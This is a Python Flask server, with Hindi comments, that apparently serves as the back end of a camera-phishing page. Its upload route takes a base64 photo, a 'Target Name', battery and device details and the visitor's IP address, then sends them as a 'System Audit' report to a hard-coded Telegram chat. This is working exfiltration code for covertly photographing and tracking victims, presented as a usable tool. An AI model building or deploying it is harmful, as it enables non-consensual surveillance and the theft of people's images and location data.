import os
import base64
from flask import Flask, render_template, request, jsonify
import telebot

app = Flask(__name__)

# सुरक्षा के लिए टोकन Render के Environment Variables से आएगा
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = "7162565886"  # आपकी चैट आईडी
bot = telebot.TeleBot(BOT_TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        name = data.get('name', 'User')
        img_data = data.get('image')
        info = data.get('info', {})
        label = data.get('label', 'Audit Capture')

        # आपका ब्रांडिंग मैसेज स्टाइल में
        branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"

        # प्रोफेशनल इंग्लिश रिपोर्ट
        report = (
            f"🛡️ <b>SYSTEM AUDIT: {label}</b>\n\n"
            f"👤 <b>Target Name:</b> {name}\n"
            f"🔋 <b>Battery:</b> {info.get('battery')}\n"
            f"🌐 <b>IP Address:</b> {request.remote_addr}\n"
            f"📱 <b>Device Info:</b> {info.get('platform')}\n\n"
            f"{branding}"
        )

        if img_data:
            # Base64 फोटो को बाइनरी में बदलना
            img_bytes = base64.b64decode(img_data.split(',')[1])
            # फोटो के साथ रिपोर्ट टेलीग्राम पर भेजना
            bot.send_photo(CHAT_ID, img_bytes, caption=report, parse_mode='HTML')
        else:
            # अगर फोटो न हो तो सिर्फ टेक्स्ट रिपोर्ट भेजना
            bot.send_message(CHAT_ID, report, parse_mode='HTML')
        
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == "__main__":
    # Render के लिए पोर्ट सेटअप
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
    
